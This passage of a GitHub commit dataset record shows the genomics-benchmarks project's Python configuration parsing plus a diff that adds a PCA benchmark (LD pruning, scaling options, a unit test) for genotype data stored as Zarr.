runtime_config.vcf_to_zarr[\"alt_number\"]\n\n                    if str(alt_number_str).lower() == \"auto\":\n                        self.alt_number = None\n                    elif isint(alt_number_str):\n                        self.alt_number = int(alt_number_str)\n                    else:\n                        raise TypeError(\"Invalid value provided for alt_number in configuration.\\n\"\n                                        \"Expected: \\\"auto\\\" or integer value\")\n                if \"chunk_length\" in runtime_config.vcf_to_zarr:\n                    chunk_length_str = runtime_config.vcf_to_zarr[\"chunk_length\"]\n                    if chunk_length_str == \"default\":\n                        self.chunk_length = None\n                    elif isint(chunk_length_str):\n                        self.chunk_length = int(chunk_length_str)\n                    else:\n                        raise TypeError(\"Invalid value provided for chunk_length in configuration.\\n\"\n                                        \"Expected: \\\"default\\\" or integer value\")\n                if \"chunk_width\" in runtime_config.vcf_to_zarr:\n                    chunk_width_str = runtime_config.vcf_to_zarr[\"chunk_width\"]\n                    if chunk_width_str == \"default\":\n                        self.chunk_width = None\n                    elif isint(chunk_width_str):\n                        self.chunk_width = int(chunk_width_str)\n                    else:\n                        raise TypeError(\"Invalid value provided for chunk_width in configuration.\\n\"\n                                        \"Expected: \\\"default\\\" or integer value\")\n                if \"compressor\" in runtime_config.vcf_to_zarr:\n                    compressor_temp = runtime_config.vcf_to_zarr[\"compressor\"]\n                    # Ensure compressor type specified is valid\n                    if compressor_temp in vcf_to_zarr_compressor_types:\n                        self.compressor = compressor_temp\n                if \"blosc_compression_algorithm\" in runtime_config.vcf_to_zarr:\n                    blosc_compression_algorithm_temp = runtime_config.vcf_to_zarr[\"blosc_compression_algorithm\"]\n                    if blosc_compression_algorithm_temp in vcf_to_zarr_blosc_algorithm_types:\n                        self.blosc_compression_algorithm = blosc_compression_algorithm_temp\n                if \"blosc_compression_level\" in runtime_config.vcf_to_zarr:\n                    blosc_compression_level_str = runtime_config.vcf_to_zarr[\"blosc_compression_level\"]\n                    if isint(blosc_compression_level_str):\n                        compression_level_int = int(blosc_compression_level_str)\n                        if (compression_level_int >= 0) and (compression_level_int <= 9):\n                            self.blosc_compression_level = compression_level_int\n                        else:\n                            raise ValueError(\"Invalid value for blosc_compression_level in configuration.\\n\"\n                                             \"blosc_compression_level must be between 0 and 9.\")\n                    else:\n                        raise TypeError(\"Invalid value for blosc_compression_level in configuration.\\n\"\n                                        \"blosc_compression_level could not be converted to integer.\")\n                if \"blosc_shuffle_mode\" in runtime_config.vcf_to_zarr:\n                    blosc_shuffle_mode_str = runtime_config.vcf_to_zarr[\"blosc_shuffle_mode\"]\n                    if isint(blosc_shuffle_mode_str):\n                        blosc_shuffle_mode_int = int(blosc_shuffle_mode_str)\n                        if blosc_shuffle_mode_int in vcf_to_zarr_blosc_shuffle_types:\n                            self.blosc_shuffle_mode = blosc_shuffle_mode_int\n                        else:\n                            raise ValueError(\"Invalid value for blosc_shuffle_mode in configuration.\\n\"\n                                             \"blosc_shuffle_mode must be a valid integer.\")\n                    else:\n                        raise TypeError(\"Invalid value for blosc_shuffle_mode in configuration.\\n\"\n                                        \"blosc_shuffle_mode could not be converted to integer.\")\n\n\nbenchmark_data_input_types = [\"vcf\", \"zarr\"]\n\n\nclass BenchmarkConfigurationRepresentation:\n    \"\"\" Utility class for object representation of the benchmark module's configuration. \"\"\"\n    benchmark_number_runs = 5\n    benchmark_data_input = \"vcf\"\n    benchmark_dataset = \"\"\n    benchmark_allele_count = False\n    benchmark_PCA = False\n    vcf_to_zarr_config = None\n\n    def __init__(self, runtime_config=None):\n        \"\"\"\n        Creates an object representation of the Benchmark module's configuration data.\n        :param runtime_config: runtime_config data to extract benchmark configuration from\n        :type runtime_config: ConfigurationRepresentation\n        \"\"\"\n        if runtime_config is not None:\n            if hasattr(runtime_config, \"benchmark\"):\n                # Extract relevant settings from config file\n                if \"benchmark_number_runs\" in runtime_config.benchmark:\n                    try:\n                        self.benchmark_number_runs = int(runtime_config.benchmark[\"benchmark_number_runs\"])\n                    except ValueError:\n                        pass\n                if \"benchmark_data_input\" in runtime_config.benchmark:\n                    benchmark_data_input_temp = runtime_config.benchmark[\"benchmark_data_input\"]\n                    if benchmark_data_input_temp in benchmark_data_input_types:\n                        self.benchmark_data_input = benchmark_data_input_temp\n                if \"benchmark_dataset\" in runtime_config.benchmark:\n                    self.benchmark_dataset = runtime_config.benchmark[\"benchmark_dataset\"]\n                if \"benchmark_allele_count\" in runtime_config.benchmark:\n                    self.benchmark_allele_count = config_str_to_bool(runtime_config.benchmark[\"benchmark_allele_count\"])\n                if \"benchmark_PCA\" in runtime_config.benchmark:\n                    self.benchmark_PCA = config_str_to_bool(runtime_config.benchmark[\"benchmark_PCA\"])\n\n            # Add the VCF to Zarr Conversion Configuration Data\n            self.vcf_to_zarr_config = VCFtoZarrConfigurationRepresentation(runtime_config=runtime_config)\n\n\ndef read_configuration(location):\n    \"\"\"\n    Args: location of the configuration file, existing configuration dictionary\n    Returns: a dictionary of the form\n    <dict>.<section>[<option>] and the corresponding values.\n    \"\"\"\n    config = ConfigurationRepresentation(location)\n    return config\n\n\ndef generate_default_config_file(output_location, overwrite=False):\n    # Get Default Config File Data as Package Resource\n    default_config_file_data = resource_string(__name__, 'config/benchmark.conf.default')\n\n    if overwrite is None:\n        overwrite = False\n\n    if output_location is not None:\n        # Check if a file currently exists at the location\n        if os.path.exists(output_location) and not overwrite:\n            print(\n                \"[Config] Could not generate configuration file: file exists at specified destination and overwrite mode disabled.\")\n            return\n\n        # Write the default configuration file to specified location\n        with open(output_location, 'wb') as output_file:\n            output_file.write(default_config_file_data)\n\n        # Check whether configuration file now exists and report status\n        if os.path.exists(output_location):\n            print(\"[Config] Configuration file has been generated successfully.\")\n        else:\n            print(\"[Config] Configuration file was not generated.\")\n"}}, "msg": "Implement Benchmark for Simple Aggregations (#36)\n\n* Update project environment, default config file, and AUTHORS\r\n\r\n-Update .gitignore to ignore test config file and IntelliJ IDEA project files\r\n-Update AUTHORS file with new contributor\r\n-Environment: Add perf and numcodecs libraries as dependencies\r\n-Config file: Update file to include spaces for consistency\r\n-Update benchmark config file to include new (future) options for ftp download and data conversion\r\n\r\n* Remove IntelliJ IDE files from code base\r\n\r\n* -Create config.py to hold functions/data for config file parsing and handling\r\n-cli.py: Move configuration-related functions to config.py & create main() function\r\n-test_cli.py: Move configuration-related unit tests to test_config.py\r\n-Update README.md to show that -f flag can be used when generating a configuration file\r\n\r\n* Add placeholder methods for unit testing: generate default configuration w/ and w/o -f flag\r\n\r\n* Begin implementing \"setup\" command, including download of files over FTP\r\n\r\n- cli.py: Add logic when running in setup mode\r\n- config.py: Add ability to read/parse configuration settings related to FTP downloader\r\n- data_service.py: Implement ftp downloading, including the ability to download all files within a remote ftp directory (recursive download)\r\n- test_data_service.py: Add unit tests for ftp download checking\r\n\r\n* Add unittest for default configuration file generation\r\n\r\n* Update config unittests\r\n\r\n- test_config.py: Add two new unit tests to ensure that a file is not overwritten normally, and that a file is overwritten while using the overwrite flag\r\n\r\n* Add two files needed for data service unit testing and update .gitignore\r\n\r\n- Update .gitignore to only ignore root level data directory\r\n- Add two missing files needed for unit testing Data Service\r\n\r\n* WIP: Add VCF to Zarr conversion (currently only uses Blosc compressor with no user configuration availalbe)\r\n\r\n* FTP Bugfix: Create local directory if it does not exist, before trying to save files to local directory\r\n\r\n* VCF to Zarr: Take downloaded files (vcf, vcf.gz) and organize them to prepare for Zarr conversion during benchmark execution\r\n\r\n* core.py: Follow PEP8\r\n\r\n* Add ability to control VCF to Zarr conversion settings from configuration file (Blosc compressor only for now)\r\n\r\nAvailable Blosc compressor algorithms: zstd, blosclz, lz4, lz4hc, zlib, snappy\r\n\r\n* Convert VCF to Zarr during Setup mode\r\n\r\n- Restructure/add new folders for dataset storage\r\n- Add conversion of VCF files to Zarr format during Setup mode\r\n- data-service: Create function to remove directory tree\r\n- Various code cleanup/formatting\r\n\r\n* Add benchmarking configuration options and parsing\r\n\r\n*  - Move data directory declarations to a separate class in data_service\r\n - Add skeleton code to benchmark core\r\n\r\n* - cli.py: Use run_(timestamp) as default label for benchmark, pass label into benchmark core\r\n- config.py: Store VCF to Zarr conversion config data in Benchmark configuration data so that settings are known when running the benchmark\r\n- core.py: Begin implementation of benchmark process, create BenchmarkRunner class to time different tasks, add benchmarking of vcf to zarr conversion process, save benchmark results to psv file\r\n- data_service.py: Update benchmark_vcf_to_zarr function to have hooks for benchmark timing when needed\r\n- requirements.txt: Add pandas to list of requirements, which is used for storing benchmark results\r\n\r\n* Code cleanup and paramater documentation\r\n\r\n* Rename BenchmarkRunner to BenchmarkProfiler, create new Benchmark class to hold all benchmarking-related code\r\n\r\n- Rename BenchmarkRunner to BenchmarkProfiler class\r\n- Add two unittest method stubs\r\n- core.py: Move benchmarking process inside new Benchmark Class for better code organization/separation\r\n- core.py: Move record_runtime function to internal function within BenchmarkProfiler class\r\n\r\n* Implement unit tests for benchmark profiler and results data\r\n\r\n* Update comment for clarity\r\n\r\n* Benchmark config: Generalize allele_count parameter by renaming to benchmark_aggregations\r\nAdd benchmark for loading Zarr dataset into memory\r\nAdd benchmark for running simple aggregations (i.e. allele count & genotype counts)\r\nVCF to Zarr: Add benchmark for determing allele count number\r\n\r\n* Benchmark simple aggregations: don't attempt to calculate alt number (max allele) as the shape of data can differ depending on input source. Hand off thi stask to the count_alleles() method\r\n\r\n* Add unit test for simple aggregations benchmark\r\n\r\n* data_service: Create function that returns genotype data from callset\r\n  Supports data sets with differing formats (e.g. callset/GT vs. callset/genotype)\r\n\r\n* Bugfix: Use an OrderedDict instead of dict to contain benchmark results. Previously, order was not preserved on Linux- and Mac-based systems using Python 3.5\r\n\r\n* numcodecs: remove unused imports\r\n\r\n* Remove unused imports for module (resulting in circular references?)\r\n\r\n* test_core.py: Fix paramter for older versions of Python (e.g. 2.7)\r\n\r\n* Bugfix: test_core.py test_benchmark_simple_aggregations() was not splitting text file by pipe separator"}, "e5195bc7bcf1060f2f727acf9f0cee033262caaa": {"url": "https://api.github.com/repos/ornl-oxford/genomics-benchmarks/commits/e5195bc7bcf1060f2f727acf9f0cee033262caaa", "html_url": "https://github.com/ornl-oxford/genomics-benchmarks/commit/e5195bc7bcf1060f2f727acf9f0cee033262caaa", "sha": "e5195bc7bcf1060f2f727acf9f0cee033262caaa", "keyword": "remote code execution check", "diff": "diff --git a/genomics_benchmarks/config.py b/genomics_benchmarks/config.py\nindex fbb8e1b..f2a65da 100644\n--- a/genomics_benchmarks/config.py\n+++ b/genomics_benchmarks/config.py\n@@ -195,6 +195,20 @@ def __init__(self, runtime_config=None):\n \n benchmark_data_input_types = [\"vcf\", \"zarr\"]\n \n+PCA_DATA_SCALER_STANDARD = 0\n+PCA_DATA_SCALER_PATTERSON = 1\n+PCA_DATA_SCALER_NONE = 2\n+benchmark_pca_data_scaler_types = {PCA_DATA_SCALER_STANDARD: 'standard',\n+                                   PCA_DATA_SCALER_PATTERSON: 'patterson',\n+                                   PCA_DATA_SCALER_NONE: None}\n+\n+GENOTYPE_ARRAY_NORMAL = 0\n+GENOTYPE_ARRAY_DASK = 1\n+GENOTYPE_ARRAY_CHUNKED = 2\n+benchmark_pca_genotype_array_types = {GENOTYPE_ARRAY_NORMAL,\n+                                      GENOTYPE_ARRAY_DASK,\n+                                      GENOTYPE_ARRAY_CHUNKED}\n+\n \n class BenchmarkConfigurationRepresentation:\n     \"\"\" Utility class for object representation of the benchmark module's configuration. \"\"\"\n@@ -202,9 +216,19 @@ class BenchmarkConfigurationRepresentation:\n     benchmark_data_input = \"vcf\"\n     benchmark_dataset = \"\"\n     benchmark_aggregations = False\n-    benchmark_PCA = False\n+    benchmark_pca = False\n     vcf_to_zarr_config = None\n \n+    # PCA-specific settings\n+    pca_number_components = 10\n+    pca_data_scaler = benchmark_pca_data_scaler_types[PCA_DATA_SCALER_PATTERSON]\n+    pca_genotype_array_type = GENOTYPE_ARRAY_DASK\n+    pca_subset_size = 100000\n+    pca_ld_pruning_number_iterations = 2\n+    pca_ld_pruning_size = 100\n+    pca_ld_pruning_step = 20\n+    pca_ld_pruning_threshold = 0.01\n+\n     def __init__(self, runtime_config=None):\n         \"\"\"\n         Creates an object representation of the Benchmark module's configuration data.\n@@ -227,8 +251,65 @@ def __init__(self, runtime_config=None):\n                     self.benchmark_dataset = runtime_config.benchmark[\"benchmark_dataset\"]\n                 if \"benchmark_aggregations\" in runtime_config.benchmark:\n                     self.benchmark_aggregations = config_str_to_bool(runtime_config.benchmark[\"benchmark_aggregations\"])\n-                if \"benchmark_PCA\" in runtime_config.benchmark:\n-                    self.benchmark_PCA = config_str_to_bool(runtime_config.benchmark[\"benchmark_PCA\"])\n+                if \"benchmark_pca\" in runtime_config.benchmark:\n+                    self.benchmark_pca = config_str_to_bool(runtime_config.benchmark[\"benchmark_pca\"])\n+                if \"pca_number_components\" in runtime_config.benchmark:\n+                    pca_number_components_str = runtime_config.benchmark[\"pca_number_components\"]\n+                    if isint(pca_number_components_str) and (int(pca_number_components_str) > 0):\n+                        self.pca_number_components = int(pca_number_components_str)\n+                    else:\n+                        raise ValueError(\"Invalid value for pca_number_components in configuration.\\n\"\n+                                         \"pca_number_components must be a valid integer greater than 0.\")\n+                if \"pca_data_scaler\" in runtime_config.benchmark:\n+                    pca_data_scaler_str = runtime_config.benchmark[\"pca_data_scaler\"]\n+                    if isint(pca_data_scaler_str) and (int(pca_data_scaler_str) in benchmark_pca_data_scaler_types):\n+                        self.pca_data_scaler = benchmark_pca_data_scaler_types[int(pca_data_scaler_str)]\n+                    else:\n+                        raise ValueError(\"Invalid value for pca_data_scaler in configuration.\\n\"\n+                                         \"pca_data_scaler must be a valid integer between 0 and 2\")\n+                if \"pca_genotype_array_type\" in runtime_config.benchmark:\n+                    pca_genotype_array_type_str = runtime_config.benchmark[\"pca_genotype_array_type\"]\n+                    if isint(pca_genotype_array_type_str) and (\n+                            int(pca_genotype_array_type_str) in benchmark_pca_genotype_array_types):\n+                        self.pca_genotype_array_type = int(pca_genotype_array_type_str)\n+                    else:\n+                        raise ValueError(\"Invalid value for pca_genotype_array_type in configuration.\\n\"\n+                                         \"pca_genotype_array_type must be a valid integer between 0 and 2\")\n+                if \"pca_subset_size\" in runtime_config.benchmark:\n+                    pca_subset_size_str = runtime_config.benchmark[\"pca_subset_size\"]\n+                    if isint(pca_subset_size_str) and (int(pca_subset_size_str) > 0):\n+                        self.pca_subset_size = int(pca_subset_size_str)\n+                    else:\n+                        raise ValueError(\"Invalid value for pca_subset_size in configuration.\\n\"\n+                                         \"pca_subset_size must be a valid integer greater than 0.\")\n+                if \"pca_ld_pruning_number_iterations\" in runtime_config.benchmark:\n+                    pca_ld_pruning_number_iterations_str = runtime_config.benchmark[\"pca_ld_pruning_number_iterations\"]\n+                    if isint(pca_ld_pruning_number_iterations_str) and (int(pca_ld_pruning_number_iterations_str) > 0):\n+                        self.pca_ld_pruning_number_iterations = int(pca_ld_pruning_number_iterations_str)\n+                    else:\n+                        raise ValueError(\"Invalid value for pca_ld_pruning_number_iterations in configuration.\\n\"\n+                                         \"pca_ld_pruning_number_iterations must be a valid integer greater than 0.\")\n+                if \"pca_ld_pruning_size\" in runtime_config.benchmark:\n+                    pca_ld_pruning_size_str = runtime_config.benchmark[\"pca_ld_pruning_size\"]\n+                    if isint(pca_ld_pruning_size_str) and (int(pca_ld_pruning_size_str) > 0):\n+                        self.pca_ld_pruning_size = int(pca_ld_pruning_size_str)\n+                    else:\n+                        raise ValueError(\"Invalid value for pca_ld_pruning_size in configuration.\\n\"\n+                                         \"pca_ld_pruning_size must be a valid integer greater than 0.\")\n+                if \"pca_ld_pruning_step\" in runtime_config.benchmark:\n+                    pca_ld_pruning_step_str = runtime_config.benchmark[\"pca_ld_pruning_step\"]\n+                    if isint(pca_ld_pruning_step_str) and (int(pca_ld_pruning_step_str) > 0):\n+                        self.pca_ld_pruning_step = int(pca_ld_pruning_step_str)\n+                    else:\n+                        raise ValueError(\"Invalid value for pca_ld_pruning_step in configuration.\\n\"\n+                                         \"pca_ld_pruning_step must be a valid integer greater than 0.\")\n+                if \"pca_ld_pruning_threshold\" in runtime_config.benchmark:\n+                    pca_ld_pruning_threshold_str = runtime_config.benchmark[\"pca_ld_pruning_threshold\"]\n+                    if isfloat(pca_ld_pruning_threshold_str) and (float(pca_ld_pruning_threshold_str) > 0):\n+                        self.pca_ld_pruning_threshold = float(pca_ld_pruning_threshold_str)\n+                    else:\n+                        raise ValueError(\"Invalid value for pca_ld_pruning_threshold in configuration.\\n\"\n+                                         \"pca_ld_pruning_threshold must be a valid float greater than 0.\")\n \n             # Add the VCF to Zarr Conversion Configuration Data\n             self.vcf_to_zarr_config = VCFtoZarrConfigurationRepresentation(runtime_config=runtime_config)\ndiff --git a/genomics_benchmarks/config/benchmark.conf.default b/genomics_benchmarks/config/benchmark.conf.default\nindex 381ec6d..eaba2a3 100644\n--- a/genomics_benchmarks/config/benchmark.conf.default\n+++ b/genomics_benchmarks/config/benchmark.conf.default\n@@ -103,7 +103,40 @@ benchmark_dataset =\n benchmark_aggregations = True\n \n # Enables Principal Component Analysis (PCA) as part of the benchmarking process.\n-benchmark_PCA = False\n+benchmark_pca = False\n+\n+# [PCA Benchmark] Specifies the number of principal components to keep when performing PCA analysis.\n+pca_number_components = 10\n+\n+# [PCA Benchmark] Specifies the type of data scaling to apply to the data set.\n+# Possible Values:\n+#   - Standard:     0\n+#   - Patterson:    1\n+#   - None:         2\n+pca_data_scaler = 1\n+\n+# [PCA Benchmark] Specifies the type of data array to use when loading the genotype data.\n+# Possible Values:\n+#   - Normal:   0\n+#   - Dask:     1\n+#   - Chunked:  2\n+pca_genotype_array_type = 2\n+\n+# [PCA Benchmark] Sets the number of SNPs to use as a subset of the data set.\n+# If the size of the data set is smaller than pca_subset_size, that will be used instead.\n+pca_subset_size = 100000\n+\n+# [PCA Benchmark: Linkage Disequilibrium] Sets the number of iterations to perform LD pruning.\n+pca_ld_pruning_number_iterations = 2\n+\n+# [PCA Benchmark: Linkage Disequilibrium] Sets the window size to use when performing LD pruning.\n+pca_ld_pruning_size = 100\n+\n+# [PCA Benchmark: Linkage Disequilibrium] Sets the number of variants to advance when performing LD pruning.\n+pca_ld_pruning_step = 20\n+\n+# [PCA Benchmark: Linkage Disequilibrium] Sets the maximum value of r^2 to include variants.\n+pca_ld_pruning_threshold = 0.01\n \n [output]\n output_results = ~/benchmark/results.psv\ndiff --git a/genomics_benchmarks/core.py b/genomics_benchmarks/core.py\nindex e1682db..c0690f4 100644\n--- a/genomics_benchmarks/core.py\n+++ b/genomics_benchmarks/core.py\n@@ -8,6 +8,7 @@\n import time  # for benchmark timer\n import csv  # for writing results\n import logging\n+import numpy as np\n import os\n import pandas as pd\n from collections import OrderedDict\n@@ -145,6 +146,9 @@ def run_benchmark(self):\n \n                     if self.bench_conf.benchmark_aggregations:\n                         self._benchmark_simple_aggregations(benchmark_zarr_path)\n+\n+                    if self.bench_conf.benchmark_pca:\n+                        self._benchmark_pca(benchmark_zarr_path)\n                 else:\n                     # Zarr dataset doesn't exist. Print error message and exit\n                     print(\"[Exec] Error: Zarr dataset could not be found for benchmarking.\")\n@@ -214,3 +218,96 @@ def _benchmark_simple_aggregations(self, zarr_path):\n         self.benchmark_profiler.start_benchmark(operation_name=\"Genotype Count: Homozygous per Sample\")\n         gt.count_hom(axis=0).compute()\n         self.benchmark_profiler.end_benchmark()\n+\n+    def _benchmark_pca(self, zarr_path):\n+        # Load Zarr dataset\n+        store = zarr.DirectoryStore(zarr_path)\n+        callset = zarr.Group(store=store, read_only=True)\n+\n+        # Get genotype data from data set\n+        genotype_array_type = self.bench_conf.pca_genotype_array_type\n+        g = data_service.get_genotype_data(callset=callset, genotype_array_type=genotype_array_type)\n+\n+        # Count alleles at each variant\n+        self.benchmark_profiler.start_benchmark('PCA: Count alleles')\n+        ac = g.count_alleles()[:]\n+        self.benchmark_profiler.end_benchmark()\n+\n+        # Count number of multiallelic SNPs\n+        self.benchmark_profiler.start_benchmark('PCA: Count multiallelic SNPs')\n+        num_multiallelic_snps = np.count_nonzero(ac.max_allele() > 1)\n+        self.benchmark_profiler.end_benchmark()\n+\n+        # Count number of biallelic singletons\n+        self.benchmark_profiler.start_benchmark('PCA: Count biallelic singletons')\n+        num_biallelic_singletons = np.count_nonzero((ac.max_allele() == 1) & ac.is_singleton(1))\n+        self.benchmark_profiler.end_benchmark()\n+\n+        # Apply filtering to remove singletons and multiallelic SNPs\n+        flt = (ac.max_allele() == 1) & (ac[:, :2].min(axis=1) > 1)\n+        flt_count = np.count_nonzero(flt)\n+        self.benchmark_profiler.start_benchmark('PCA: Remove singletons and multiallelic SNPs')\n+        if flt_count > 0:\n+            gf = g.compress(flt, axis=0)\n+        else:\n+            # Don't apply filtering\n+            print('[Exec][PCA] Cannot remove singletons and multiallelic SNPs as no data would remain. Skipping...')\n+            gf = g\n+        self.benchmark_profiler.end_benchmark()\n+\n+        # Transform genotype data into 2-dim matrix\n+        self.benchmark_profiler.start_benchmark('PCA: Transform genotype data for PCA')\n+        gn = gf.to_n_alt()\n+        self.benchmark_profiler.end_benchmark()\n+\n+        # Randomly choose subset of SNPs\n+        n = min(gn.shape[0], self.bench_conf.pca_subset_size)\n+        vidx = np.random.choice(gn.shape[0], n, replace=False)\n+        vidx.sort()\n+        gnr = gn.take(vidx, axis=0)\n+\n+        # Apply LD pruning to subset of SNPs\n+        size = self.bench_conf.pca_ld_pruning_size\n+        step = self.bench_conf.pca_ld_pruning_step\n+        threshold = self.bench_conf.pca_ld_pruning_threshold\n+        n_iter = self.bench_conf.pca_ld_pruning_number_iterations\n+\n+        self.benchmark_profiler.start_benchmark('PCA: Apply LD pruning')\n+        gnu = self._pca_ld_prune(gnr, size=size, step=step, threshold=threshold, n_iter=n_iter)\n+        self.benchmark_profiler.end_benchmark()\n+\n+        # If data is chunked, move to memory for PCA\n+        self.benchmark_profiler.start_benchmark('PCA: Move data set to memory')\n+        gnu = gnu[:]\n+        self.benchmark_profiler.end_benchmark()\n+\n+        # Run PCA analysis\n+        pca_num_components = self.bench_conf.pca_number_components\n+        scaler = self.bench_conf.pca_data_scaler\n+\n+        # Run conventional PCA analysis\n+        self.benchmark_profiler.start_benchmark(\n+            'PCA: Run conventional PCA analysis (scaler: {})'.format(scaler if scaler is not None else 'none'))\n+        allel.pca(gnu, n_components=pca_num_components, scaler=scaler)\n+        self.benchmark_profiler.end_benchmark()\n+\n+        # Run randomized PCA analysis\n+        self.benchmark_profiler.start_benchmark(\n+            'PCA: Run randomized PCA analysis (scaler: {})'.format(scaler if scaler is not None else 'none'))\n+        allel.randomized_pca(gnu, n_components=pca_num_components, scaler=scaler)\n+        self.benchmark_profiler.end_benchmark()\n+\n+    @staticmethod\n+    def _pca_ld_prune(gn, size, step, threshold=.1, n_iter=1):\n+        blen = size * 10\n+        for i in range(n_iter):\n+            loc_unlinked = allel.locate_unlinked(gn, size=size, step=step, threshold=threshold, blen=blen)\n+            n = np.count_nonzero(loc_unlinked)\n+            n_remove = gn.shape[0] - n\n+            print(\n+                '[Exec][PCA][LD Prune] Iteration {}/{}: Retaining {} and removing {} variants.'.format(i + 1,\n+                                                                                                       n_iter,\n+                                                                                                       n,\n+                                                                                                       n_remove))\n+            gn = gn.compress(loc_unlinked, axis=0)\n+        return gn\ndiff --git a/genomics_benchmarks/data_service.py b/genomics_benchmarks/data_service.py\nindex 2dcf8b4..75dc5f1 100644\n--- a/genomics_benchmarks/data_service.py\n+++ b/genomics_benchmarks/data_service.py\n@@ -366,12 +366,7 @@ def convert_to_zarr(input_vcf_path, output_zarr_path, conversion_config, benchma\n             benchmark_profiler.end_benchmark()\n \n \n-GENOTYPE_ARRAY_NORMAL = 0\n-GENOTYPE_ARRAY_DASK = 1\n-GENOTYPE_ARRAY_CHUNKED = 2\n-\n-\n-def get_genotype_data(callset, genotype_array_type=GENOTYPE_ARRAY_DASK):\n+def get_genotype_data(callset, genotype_array_type=config.GENOTYPE_ARRAY_DASK):\n     genotype_ref_name = ''\n \n     # Ensure 'calldata' is within the callset\n@@ -386,11 +381,11 @@ def get_genotype_data(callset, genotype_array_type=GENOTYPE_ARRAY_DASK):\n     else:\n         return None\n \n-    if genotype_array_type == GENOTYPE_ARRAY_NORMAL:\n+    if genotype_array_type == config.GENOTYPE_ARRAY_NORMAL:\n         return allel.GenotypeArray(callset['calldata'][genotype_ref_name])\n-    elif genotype_array_type == GENOTYPE_ARRAY_DASK:\n+    elif genotype_array_type == config.GENOTYPE_ARRAY_DASK:\n         return allel.GenotypeDaskArray(callset['calldata'][genotype_ref_name])\n-    elif genotype_array_type == GENOTYPE_ARRAY_CHUNKED:\n+    elif genotype_array_type == config.GENOTYPE_ARRAY_CHUNKED:\n         return allel.GenotypeChunkedArray(callset['calldata'][genotype_ref_name])\n     else:\n         return None\ndiff --git a/requirements.txt b/requirements.txt\nindex 6fe29ac..ece38fb 100644\n--- a/requirements.txt\n+++ b/requirements.txt\n@@ -10,7 +10,9 @@ dask\n numcodecs\n zarr\n toolz\n+scikit-learn\n scikit-allel\n perf\n+dask\n mock ; python_version == '2.7'\n pathlib ; python_version == '2.7'\ndiff --git a/tests/data/config_test_reading_runtime.conf b/tests/data/config_test_reading_runtime.conf\nindex 960e197..e54beb5 100644\n--- a/tests/data/config_test_reading_runtime.conf\n+++ b/tests/data/config_test_reading_runtime.conf\n@@ -26,7 +26,15 @@ benchmark_number_runs = 5\n benchmark_data_input = vcf\n benchmark_dataset =\n benchmark_aggregations = True\n-benchmark_PCA = False\n+benchmark_pca = False\n+pca_number_components = 10\n+pca_data_scaler = 1\n+pca_genotype_array_type = 2\n+pca_subset_size = 100000\n+pca_ld_pruning_number_iterations = 2\n+pca_ld_pruning_size = 100\n+pca_ld_pruning_step = 20\n+pca_ld_pruning_threshold = 0.01\n \n [output]\n output_results = ~/benchmark/results.psv\ndiff --git a/tests/test_cli.py b/tests/test_cli.py\nindex 5e970d8..fe1208e 100644\n--- a/tests/test_cli.py\n+++ b/tests/test_cli.py\n@@ -35,7 +35,7 @@ def test_getting_command_arguments(self):\n         # Test group 2 -- setup\n         self.run_subparser_test(\"setup\", \"config_file\", \"./benhcmark.conf\")\n         # Test group 3 - Tests if it the argparser is setting default values \"\"\"\n-        self.run_subparser_test(\"exec\",\"config_file\",\"./benchmark.conf\")\n+        self.run_subparser_test(\"exec\", \"config_file\", \"./benchmark.conf\")\n \n     def test_parser_expected_failing(self):\n         \"\"\" Test that parsing fails on no command option (a choice of a subparser), or an unrecognized command (\"something\") \"\"\"\ndiff --git a/tests/test_core.py b/tests/test_core.py\nindex c3fd8ec..6bb5bdf 100644\n--- a/tests/test_core.py\n+++ b/tests/test_core.py\n@@ -208,6 +208,93 @@ def test_benchmark_simple_aggregations(self):\n         if os.path.isfile(psv_file):\n             os.remove(psv_file)\n \n+    def test_benchmark_pca(self):\n+        test_dir = './tests_temp/'\n+        benchmark_label = 'test_benchmark_pca'\n+        psv_file = '{}.psv'.format(benchmark_label)\n+\n+        # Remove the test data directory from any previous unit tests\n+        if os.path.isdir(test_dir):\n+            shutil.rmtree(test_dir)\n+\n+        # Remove the PSV file from any previous unit tests\n+        if os.path.isfile(psv_file):\n+            os.remove(psv_file)\n+\n+        vcf_to_zar_config = VCFtoZarrConfigurationRepresentation()\n+        vcf_to_zar_config.enabled = True\n+\n+        bench_conf = BenchmarkConfigurationRepresentation()\n+        bench_conf.vcf_to_zarr_config = vcf_to_zar_config\n+        bench_conf.benchmark_number_runs = 1\n+        bench_conf.benchmark_data_input = 'vcf'\n+        bench_conf.benchmark_dataset = 'trio.2010_06.ychr.genotypes.vcf'\n+        bench_conf.benchmark_pca = True\n+        bench_conf.pca_data_scaler = config.benchmark_pca_data_scaler_types[config.PCA_DATA_SCALER_PATTERSON]\n+        bench_conf.pca_genotype_array_type = config.GENOTYPE_ARRAY_CHUNKED\n+\n+        data_dirs = DataDirectoriesConfigurationRepresentation()\n+        data_dirs.vcf_dir = './tests/data/'\n+        data_dirs.zarr_dir_setup = './tests_temp/zarr/'\n+        data_dirs.zarr_dir_benchmark = './tests_temp/zarr_benchmark/'\n+        data_dirs.temp_dir = './tests_temp/temp/'\n+\n+        # Run the benchmark and ensure nothing fails\n+        benchmark = Benchmark(bench_conf=bench_conf,\n+                              data_dirs=data_dirs,\n+                              benchmark_label=benchmark_label)\n+        benchmark.run_benchmark()\n+\n+        # Ensure psv file was created\n+        if os.path.exists(psv_file):\n+            # Read file contents\n+            with open(psv_file, 'r') as f:\n+                psv_lines = [line.rstrip('\\n') for line in f]\n+\n+            # Check line count of psv file\n+            num_lines = len(psv_lines)\n+            num_lines_expected = 14\n+            self.assertEqual(num_lines_expected, num_lines, msg='Unexpected line count in resulting psv file.')\n+\n+            psv_operation_names = []\n+\n+            for psv_line in psv_lines:\n+                line_split = psv_line.split('|')\n+                line_cols_actual = len(line_split)\n+                line_cols_expected = 4\n+\n+                # Ensure correct number of data columns exist for current line of data\n+                self.assertEqual(line_cols_expected, line_cols_actual,\n+                                 msg='Unexpected number of columns in resulting psv file')\n+\n+                operation_name = line_split[2]\n+                psv_operation_names.append(operation_name)\n+\n+            # Ensure all aggregations were run\n+            test_operation_names = ['PCA: Count alleles',\n+                                    'PCA: Count multiallelic SNPs',\n+                                    'PCA: Count biallelic singletons',\n+                                    'PCA: Remove singletons and multiallelic SNPs',\n+                                    'PCA: Transform genotype data for PCA',\n+                                    'PCA: Apply LD pruning',\n+                                    'PCA: Move data set to memory',\n+                                    'PCA: Run conventional PCA analysis (scaler: patterson)',\n+                                    'PCA: Run randomized PCA analysis (scaler: patterson)']\n+\n+            for test_operation_name in test_operation_names:\n+                if test_operation_name not in psv_operation_names:\n+                    self.fail(msg='Operation \\\"{}\\\" was not run during the 